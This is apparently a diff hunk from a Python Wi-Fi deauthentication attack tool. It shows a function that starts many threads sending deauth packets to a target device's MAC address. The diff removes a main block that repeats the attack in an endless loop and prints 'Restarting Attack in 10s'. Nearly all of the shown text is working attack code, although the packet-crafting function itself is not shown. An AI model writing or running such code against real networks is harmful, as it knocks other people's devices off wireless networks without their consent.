@@ -82,14 +82,3 @@ def _kick_(deauth_func, target_addr, packages_size, threads_count, start_time=0)
     #     [result.get() for result in results]
     for i in range(0, threads_count):
         threading.Thread(target=deauth_func, args=(target_addr, packages_size)).start()
-
-if __name__ == '__main__':
-    try:
-        while True:
-            _kick_(deauth_Method_1, TARGET_DEVICE_MAC, 600, threads_count, 1)
-            print("Restarting Attack in 10s")
-            time.sleep(10)
-    except KeyboardInterrupt:
-        time.sleep(0.1)
-        console.print('\n[red] :fax: Aborted')
-        exit()
